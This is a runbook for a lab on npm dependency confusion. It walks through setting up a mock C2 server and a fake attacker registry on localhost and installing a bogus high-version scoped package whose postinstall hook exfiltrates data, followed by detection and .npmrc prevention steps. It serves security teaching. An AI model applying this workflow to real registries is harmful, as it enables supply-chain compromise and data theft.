# 🚀 Quick Reference Card - Scenario 2: Dependency Confusion

Use this as your runbook for Scenario 2 when you are teaching live or practicing quickly.



## Table of Contents

<div class="doc-toc">

- [📋 Initial Setup](#📋-initial-setup)
- [🎯 Attack Execution](#🎯-attack-execution)
- [🔍 Detection Commands](#🔍-detection-commands)
- [🛡️ Prevention Commands](#🛡️-prevention-commands)
- [📁 Important File Locations](#📁-important-file-locations)
- [🛠️ Useful Commands](#🛠️-useful-commands)
- [🆘 Quick Troubleshooting](#🆘-quick-troubleshooting)
- [📚 Documentation Links](#📚-documentation-links)
- [💡 Key Concepts](#💡-key-concepts)

</div>

---
## 📋 Initial Setup

```bash
cd scenarios/02-dependency-confusion
export TESTBENCH_MODE=enabled
./setup.sh
```

## 🎯 Attack Execution

Three terminals (or background A + B):

```bash
# Terminal A — mock C2 (port 3000)
node infrastructure/mock-server.js

# Terminal B — fake public registry (port 4874)
node infrastructure/registry-server.js

# Terminal C — victim
cat corporate-app/.npmrc          # @techcorp:registry → localhost:4874 (misconfigured!)
cd corporate-app
rm -rf node_modules package-lock.json
npm cache clean --force
export TESTBENCH_MODE=enabled
npm install                       # resolves @techcorp/auth-lib@999.999.999 from attacker registry
npm start                         # app still works; postinstall already exfiltrated

curl -s http://localhost:3000/captured-data
```

## 🔍 Detection Commands

```bash
node detection-tools/dependency-confusion-scanner.js corporate-app
npm list @techcorp/auth-lib
cat corporate-app/node_modules/@techcorp/auth-lib/package.json
cat scenarios/02-dependency-confusion/DETECT.md
```

## 🛡️ Prevention Commands

```bash
# Fix .npmrc — point @techcorp scope at INTERNAL registry only
cat > corporate-app/.npmrc << 'EOF'
@techcorp:registry=https://internal-registry.techcorp.local/
registry=https://registry.npmjs.org/
EOF

rm -rf node_modules package-lock.json
npm install
npm list @techcorp/auth-lib
```

## 📁 Important File Locations

```text
scenarios/02-dependency-confusion/
├── infrastructure/
│   ├── mock-server.js          # C2 receiver (:3000)
│   ├── registry-server.js      # Attacker fake public registry (:4874)
│   └── build-registry.js       # Packs attacker tarball + metadata
├── attacker-packages/@techcorp/auth-lib/  # Malicious v999.999.999
├── internal-packages/@techcorp/           # Legitimate internal packages
├── corporate-app/.npmrc        # Vulnerable scope routing (lab)
├── work/                       # Runtime tarballs + registry-meta.json (gitignored)
└── detection-tools/dependency-confusion-scanner.js
```

## 🛠️ Useful Commands

```bash
cat leaked-data/package.json
node infrastructure/build-registry.js
curl -s http://localhost:4874/@techcorp%2Fauth-lib | jq '.versions | keys'
curl -X DELETE http://localhost:3000/captured-data
```

## 🆘 Quick Troubleshooting

| Problem | Solution |
|---------|----------|
| No capture after install | Ensure registry-server (:4874) and mock-server (:3000) are running; `export TESTBENCH_MODE=enabled` before `npm install` |
| Wrong version / file: path | Delete `node_modules` + `package-lock.json`; run `npm cache clean --force`; confirm `.npmrc` points `@techcorp` to `:4874` |
| Registry connection refused | Start `node infrastructure/registry-server.js`; re-run `node infrastructure/build-registry.js` if `work/` missing |
| EADDRINUSE on 3000/4874 | `lsof -ti :3000 -ti :4874 \| xargs kill -9` then restart servers |

## 📚 Documentation Links

- Full Guide: `documentation/scenario-guides/zero-to-hero/ZERO_TO_HERO_SCENARIO_02.md`
- Scenario README: `scenarios/02-dependency-confusion/README.md`
- Detection runbook: `scenarios/02-dependency-confusion/DETECT.md`

## 💡 Key Concepts

- **Dependency Confusion**: Scoped internal name published to public/attacker registry with higher semver
- **Registry race**: npm picks `999.999.999` over internal `1.x` when scope routing is wrong
- **postinstall**: Exfiltration fires at install time — no `npm start` required
- **Detection**: Anomalous semver, wrong `resolved` registry, postinstall in scoped internal packages
- **Prevention**: `@scope:registry` to internal host only; lock files; CI registry validation
